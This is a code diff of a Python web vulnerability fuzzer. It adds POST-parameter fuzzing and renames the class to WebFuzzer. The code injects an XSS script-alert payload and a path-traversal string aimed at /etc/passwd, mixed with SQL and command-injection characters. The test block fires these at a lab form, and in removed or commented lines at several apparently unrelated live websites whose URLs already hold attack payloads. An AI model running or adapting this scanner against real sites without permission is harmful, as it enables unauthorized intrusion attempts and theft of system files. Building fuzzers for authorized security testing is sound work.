@@ -17,7 +17,7 @@ from massweb.vuln_checks.xpathi import XPathICheck
 from massweb.vuln_checks.xss import XSSCheck
 from massweb.results.result import Result
 
-class GetFuzzer(iFuzzer):
+class WebFuzzer(iFuzzer):
 
     def __init__(self, targets = [], payloads = [], num_threads = 10, time_per_url = 10, request_timeout = 10, proxy_list = [{}]):
 
@@ -51,7 +51,7 @@ class GetFuzzer(iFuzzer):
 
         return url_reassembled
 
-    def __generate_fuzzy_target(self, target):
+    def __generate_fuzzy_target_get(self, target):
 
         url = target.url
         parsed_url = urlparse(url)
@@ -69,23 +69,43 @@ class GetFuzzer(iFuzzer):
 
         return fuzzy_targets
 
+    def __generate_fuzzy_target_post(self, target):
+
+        url = target.url
+        fuzzy_targets = []
+        post_keys = target.data.keys()
+
+        for key in post_keys:
+            data_copy = target.data.copy()
+
+            for payload in self.payloads:
+                data_copy[key] = str(payload)
+                fuzzy_target = FuzzyTarget(url, "post", data = data_copy, payload = payload)
+                fuzzy_targets.append(fuzzy_target)
+
+        return fuzzy_targets
+
     def generate_fuzzy_targets(self):
 
         if len(self.targets) == 0:
             raise Exception("Targets list must not be empty!")
 
-        fuzzy_targets = []
+        self.fuzzy_targets = []
         for target in self.targets:
 
-            fuzzy_target_list = self.__generate_fuzzy_target(target)
-            fuzzy_targets += fuzzy_target_list
+            if target.ttype == "get":
+                fuzzy_target_list = self.__generate_fuzzy_target_get(target)
+                self.fuzzy_targets += fuzzy_target_list
+
+            if target.ttype == "post":
+                fuzzy_target_list = self.__generate_fuzzy_target_post(target)
+                self.fuzzy_targets += fuzzy_target_list
             
-        return fuzzy_targets
+        return self.fuzzy_targets
 
     def fuzz(self):
 
-        fuzzy_targets = self.generate_fuzzy_targets()
-        self.mreq.get_targets(fuzzy_targets)
+        self.mreq.request_targets(self.fuzzy_targets)
         results = []
         for r in self.mreq.results:
             sys.stderr.write("Parsing doc")
@@ -125,29 +145,45 @@ class GetFuzzer(iFuzzer):
             xss_result = self.xss_check.check(response)
             result_dic["xss"] = xss_result
 
+        print response
         return Result(ftarget, result_dic)
 
 if __name__ == "__main__":
 
-    gf = GetFuzzer(proxy_list = [{}])
-    mx_sqli_xmli_trav_osci_payload = Payload("../../../../../../../../../../../../../../../../../../../../etc/passwd#--'@!\\"
-                                             , check_type_list = ["mxi", "sqli", "xpathi", "trav", "osci"])
-
     xss_payload = Payload('"><ScRipT>alert(31337)</ScrIpT>', check_type_list = ["xss"])
 
-    gf.add_payload(mx_sqli_xmli_trav_osci_payload)
-    gf.add_payload(xss_payload)
+    wf = WebFuzzer()
+    wf.add_payload(xss_payload)
+#    t1 = Target("http://www.hyperiongray.com", data = {"p1" : "v1", "p2" : "v2"}, ttype = "post")
+    t2 = Target(url = "http://course.hyperiongray.com/vuln2/898538a7335fd8e6bac310f079ba3fd1/formhandler.php", data = {"how" : "%27"}, ttype = "post")
+#    wf.add_target_from_url("http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=snippetdetail&amp;ID=1368&amp;Sectionid=%27%29")
+#    wf.add_target_from_url("http://www.dobrevsource.org/index.php?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd")
+#    wf.add_target(t1)
+    wf.add_target(t2)
+    for target in wf.generate_fuzzy_targets():
+        print target.url, str(target.data)
 
-    gf.add_target_from_url("http://www.hyperiongray.com/?q=user&t=eke")
-    gf.add_target_from_url("http://www.sfgcd.com/ProductsBuy.asp?ProNo=%22%3E%3CSCrIpT%3Ealert%2826702%29%3C%2FScRiPt%3E&amp;ProName=%C2%A2%C3%81%C2%A03%083D%09")
-    gf.add_target_from_url("http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=snippetdetail&amp;ID=1368&amp;Sectionid=%27%29")
-    gf.add_target_from_url("http://www.dobrevsource.org/index.php?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd")
-    gf.add_target_from_url("http://www.dobrevsource.org/")
-    gf.add_target_from_url("http://www.wpsurfing.co.za/?feed=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E")
+    for r in wf.fuzz():
+        print r, r.fuzzy_target.ttype, r.fuzzy_target.payload
 
+#    gf = GetFuzzer(proxy_list = [{}])
+#    mx_sqli_xmli_trav_osci_payload = Payload("../../../../../../../../../../../../../../../../../../../../etc/passwd#--'@!\\"
+#                                             , check_type_list = ["mxi", "sqli", "xpathi", "trav", "osci"])
+#
+
+#    gf.add_payload(mx_sqli_xmli_trav_osci_payload)
+#    gf.add_payload(xss_payload)
+
+#    gf.add_target_from_url("http://www.hyperiongray.com/?q=user&t=eke")
+#    gf.add_target_from_url("http://www.sfgcd.com/ProductsBuy.asp?ProNo=%22%3E%3CSCrIpT%3Ealert%2826702%29%3C%2FScRiPt%3E&amp;ProName=%C2%A2%C3%81%C2%A03%083D%09")
+#    gf.add_target_from_url("http://www.gayoutdoors.com/page.cfm?snippetset=yes&amp;typeofsite=snippetdetail&amp;ID=1368&amp;Sectionid=%27%29")
+#    gf.add_target_from_url("http://www.dobrevsource.org/index.php?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd")
+#    gf.add_target_from_url("http://www.dobrevsource.org/")
+#    gf.add_target_from_url("http://www.wpsurfing.co.za/?feed=%22%3E%3CScRipT%3Ealert%2831337%29%3C%2FScrIpT%3E")
+#
 #    for t in gf.generate_fuzzy_targets():
 #        print t.url
 #        print t.payload.check_type_list
-
-    for res in gf.fuzz():
-        print res
+#
+#    for res in gf.fuzz():
+#        print res
